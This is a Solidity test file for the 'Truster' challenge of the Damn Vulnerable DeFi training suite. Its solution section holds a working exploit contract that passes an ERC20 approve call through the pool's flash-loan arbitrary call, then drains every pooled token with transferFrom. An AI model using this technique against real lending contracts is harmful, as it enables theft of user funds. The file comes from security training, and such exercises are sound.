// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // Can't pass since is more than 1 tx
        // bytes memory data = abi.encodeWithSignature(
        //     "approve(address,uint256)",
        //     address(player), // the reason put player here is the vm.startPrank(player), test file will run as player, not address(this) / TrusterChallenge
        //     TOKENS_IN_POOL
        // );
        // pool.flashLoan(0, address(this), address(token), data);
        // token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);

        // Put it in a single contract, can execute within 1 tx
        new AttackContract(pool, token, recovery, TOKENS_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}

// Abuse the target.functionCall(data);
// We can update the victim's allowance mapping by the approve() function
//   since this is an ERC20 token
// allowance[attcker] = TOKENS_IN_POOL
contract AttackContract {
    constructor(
        TrusterLenderPool _pool,
        DamnValuableToken _token,
        address _recovery,
        uint256 _amount
    ) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this), // will bypass the vm.startPrank() and call it using address(this)
            _amount
        );
        _pool.flashLoan(0, address(this), address(_token), data); // try to approve AttackContract using
        console.log(_token.allowance(address(_pool), address(this)));
        _token.transferFrom(address(_pool), _recovery, _amount); //
    }
}
